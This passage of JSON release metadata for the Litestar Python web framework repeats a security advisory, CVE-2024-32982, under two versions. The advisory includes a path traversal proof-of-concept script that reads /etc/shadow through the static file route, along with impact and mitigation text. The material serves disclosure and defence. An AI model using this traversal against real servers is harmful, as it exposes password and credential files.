Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":"api, asgi, litestar, rest, starlite","license":"MIT","maintainer":null,"maintainer_email":"Litestar Developers <hello@litestar.dev>, Cody Fincher <cody@litestar.dev>, Jacob Coffee <jacob@litestar.dev>, Janek Nouvertné <janek@litestar.dev>, Peter Schutt <peter@litestar.dev>, Visakh Unnikrishnan <guacs@litestar.dev>, Alc <alc@litestar.dev>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/litestar","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":["annotated-types","attrs","brotli","cli","cryptography","full","jinja","jwt","mako","minijinja","opentelemetry","piccolo","picologging","prometheus","pydantic","redis","sqlalchemy","standard","structlog"],"release_url":"https://pypi.org/project/litestar/2.12.1/","requires_dist":["anyio>=3","click","exceptiongroup; python_version < \"3.11\"","httpx>=0.22","importlib-metadata; python_version < \"3.10\"","importlib-resources>=5.12.0; python_version < \"3.9\"","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == \"annotated-types\"","attrs; extra == \"attrs\"","brotli; extra == \"brotli\"","jsbeautifier; extra == \"cli\"","uvicorn[standard]; extra == \"cli\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"cli\"","cryptography; extra == \"cryptography\"","advanced-alchemy>=0.2.2; extra == \"full\"","annotated-types; extra == \"full\"","attrs; extra == \"full\"","brotli; extra == \"full\"","cryptography; extra == \"full\"","email-validator; extra == \"full\"","fast-query-parsers>=1.0.2; extra == \"full\"","jinja2; extra == \"full\"","jinja2>=3.1.2; extra == \"full\"","jsbeautifier; extra == \"full\"","mako>=1.2.4; extra == \"full\"","minijinja>=1.0.0; extra == \"full\"","opentelemetry-instrumentation-asgi; extra == \"full\"","piccolo; extra == \"full\"","picologging; extra == \"full\"","prometheus-client; extra == \"full\"","pydantic; extra == \"full\"","pydantic-extra-types; extra == \"full\"","pyjwt>=2.9.0; extra == \"full\"","redis[hiredis]>=4.4.4; extra == \"full\"","structlog; extra == \"full\"","uvicorn[standard]; extra == \"full\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"full\"","jinja2>=3.1.2; extra == \"jinja\"","cryptography; extra == \"jwt\"","pyjwt>=2.9.0; extra == \"jwt\"","mako>=1.2.4; extra == \"mako\"","minijinja>=1.0.0; extra == \"minijinja\"","opentelemetry-instrumentation-asgi; extra == \"opentelemetry\"","piccolo; extra == \"piccolo\"","picologging; extra == \"picologging\"","prometheus-client; extra == \"prometheus\"","email-validator; extra == \"pydantic\"","pydantic; extra == \"pydantic\"","pydantic-extra-types; extra == \"pydantic\"","redis[hiredis]>=4.4.4; extra == \"redis\"","advanced-alchemy>=0.2.2; extra == \"sqlalchemy\"","fast-query-parsers>=1.0.2; extra == \"standard\"","jinja2; extra == \"standard\"","jsbeautifier; extra == \"standard\"","uvicorn[standard]; extra == \"standard\"","uvloop>=0.18.0; sys_platform != \"win32\" and extra == \"standard\"","structlog; extra == \"structlog\""],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.12.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"a61103814d85f1229478dbded9daa26a8c2b33af3d1f5436923960f89a415090","md5":"d1a58dd3f0687b4d1ae8809c073e739b","sha256":"74915e3731c200caa099c416a1c3b3079ffacdd6e6393974e0284f8919606f9c"},"downloads":-1,"filename":"litestar-2.12.1-py3-none-any.whl","has_sig":false,"md5_digest":"d1a58dd3f0687b4d1ae8809c073e739b","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":542039,"upload_time":"2024-09-21T14:41:49","upload_time_iso_8601":"2024-09-21T14:41:49.730398Z","url":"https://files.pythonhosted.org/packages/a6/11/03814d85f1229478dbded9daa26a8c2b33af3d1f5436923960f89a415090/litestar-2.12.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f59955eccbf8006d058a87dc2c8cddf6dca0923a32cffd18b00ffc1c6685e8c5","md5":"6574ccef24694ad32ee4230d646b9585","sha256":"d2cc43157060a06dac8a77e9dc6ba2936238beada61e272e8842c21fca23fcee"},"downloads":-1,"filename":"litestar-2.12.1.tar.gz","has_sig":false,"md5_digest":"6574ccef24694ad32ee4230d646b9585","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":716788,"upload_time":"2024-09-21T14:41:51","upload_time_iso_8601":"2024-09-21T14:41:51.369352Z","url":"https://files.pythonhosted.org/packages/f5/99/55eccbf8006d058a87dc2c8cddf6dca0923a32cffd18b00ffc1c6685e8c5/litestar-2.12.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.2.0":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Twitter":"https://twitter.com/LitestarAPI","documentation":"https://docs.litestar.dev/","homepage":"https://litestar.dev/","repository":"https://github.com/litestar-org/litestar"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.2.0/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","cryptography; extra == 'cryptography'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","pydantic-extra-types; extra == 'pydantic'","pydantic[email]; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy==0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.2.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"62a03614d5a84f66d197b26cc954b7efcc69421920dedcc760a38c0b8c05ede9","md5":"a81003481350511a65e2d0cab95fa5ba","sha256":"d4608967e39f64e9bfea69168268b79bc796f36d7ef92c6d51abdfa89e1c56be"},"downloads":-1,"filename":"litestar-2.2.0-py3-none-any.whl","has_sig":false,"md5_digest":"a81003481350511a65e2d0cab95fa5ba","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":464736,"upload_time":"2023-10-12T09:20:20","upload_time_iso_8601":"2023-10-12T09:20:20.542811Z","url":"https://files.pythonhosted.org/packages/62/a0/3614d5a84f66d197b26cc954b7efcc69421920dedcc760a38c0b8c05ede9/litestar-2.2.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"89f76e7b72fa3e76c36d6f3c5b148271218c57bf264be1adbd359eb3f9e34ce2","md5":"4be51c0a603fc0df86bb2c44ae989ab0","sha256":"d8c62d06c70377e2bb6c4116d608da91f0c5423f819add433bf2a7ec3f7f8bda"},"downloads":-1,"filename":"litestar-2.2.0.tar.gz","has_sig":false,"md5_digest":"4be51c0a603fc0df86bb2c44ae989ab0","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":589602,"upload_time":"2023-10-12T09:20:22","upload_time_iso_8601":"2023-10-12T09:20:22.741877Z","url":"https://files.pythonhosted.org/packages/89/f7/6e7b72fa3e76c36d6f3c5b148271218c57bf264be1adbd359eb3f9e34ce2/litestar-2.2.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.2.1":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"api,asgi,litestar,rest,starlite","license":"MIT","maintainer":"","maintainer_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Peter Schutt <peter.github@proton.me>","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/LitestarAPI","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.2.1/","requires_dist":["anyio>=3","click","httpx>=0.22","importlib-metadata; python_version < '3.10'","importlib-resources>=5.12.0; python_version < '3.9'","msgspec>=0.18.2","multidict>=6.0.2","polyfactory>=2.6.3","pyyaml","rich-click","rich>=13.0.0","typing-extensions","annotated-types; extra == 'annotated-types'","attrs; extra == 'attrs'","brotli; extra == 'brotli'","jsbeautifier; extra == 'cli'","uvicorn[standard]; extra == 'cli'","cryptography; extra == 'cryptography'","litestar[annotated-types,attrs,brotli,cli,cryptography,jinja,jwt,mako,minijinja,opentelemetry,piccolo,picologging,prometheus,pydantic,redis,sqlalchemy,standard,structlog]; extra == 'full'","jinja2>=3.1.2; extra == 'jinja'","cryptography; extra == 'jwt'","python-jose; extra == 'jwt'","mako>=1.2.4; extra == 'mako'","minijinja>=1.0.0; extra == 'minijinja'","opentelemetry-instrumentation-asgi; extra == 'opentelemetry'","piccolo; extra == 'piccolo'","picologging; extra == 'picologging'","prometheus-client; extra == 'prometheus'","pydantic-extra-types; extra == 'pydantic'","pydantic[email]; extra == 'pydantic'","redis[hiredis]>=4.4.4; extra == 'redis'","advanced-alchemy==0.2.2; extra == 'sqlalchemy'","fast-query-parsers>=1.0.2; extra == 'standard'","jinja2; extra == 'standard'","jsbeautifier; extra == 'standard'","uvicorn[standard]; extra == 'standard'","structlog; extra == 'structlog'"],"requires_python":"<4.0,>=3.8","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.2.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"a8cc3276a5bc97210ce37d739a6aa6e4b717ce29eb0585255a9dd3323b513451","md5":"bfa7c4d3d24265b36e50ebeb62abb1be","sha256":"f8b6100bb6a0f4204d9b9a187a0dc5ea1a88dac29f6d0d83136497979f8a7e74"},"downloads":-1,"filename":"litestar-2.2.1-py3-none-any.whl","has_sig":false,"md5_digest":"bfa7c4d3d24265b36e50ebeb62abb1be","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4.0,>=3.8","size":464945,"upload_time":"2023-10-13T01:03:48","upload_time_iso_8601":"2023-10-13T01:03:48.120919Z","url":"https://files.pythonhosted.org/packages/a8/cc/3276a5bc97210ce37d739a6aa6e4b717ce29eb0585255a9dd3323b513451/litestar-2.2.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"321b5435bd3a0f061651797daceb33b8b75d4d06fe89bb8c4d53aa6c7e48f39e","md5":"8f10f7172b7a638af95b623033f402d1","sha256":"cf93b913d620866c5de6b85ef4480a85816c83f9efacb49d2a06fb4f7d802d5a"},"downloads":-1,"filename":"litestar-2.2.1.tar.gz","has_sig":false,"md5_digest":"8f10f7172b7a638af95b623033f402d1","packagetype":"sdist","python_version":"source","requires_python":"<4.0,>=3.8","size":589847,"upload_time":"2023-10-13T01:03:50","upload_time_iso_8601":"2023-10-13T01:03:50.358616Z","url":"https://files.pythonhosted.org/packages/32/1b/5435bd3a0f061651797daceb33b8b75d4d06fe89bb8c4d53aa6c7e48f39e/litestar-2.2.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.3.0":{"info":{"author":"","author_email":"Cody Fincher <cody.fincher@gmail.com>, Jacob Coffee <jacob@z7x.org>, Janek Nouvertné <provinzkraut@posteo.de>, Na'aman Hirschfeld <nhirschfeld@gmail.com>, Peter Schutt <peter.github@proton.me>","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: 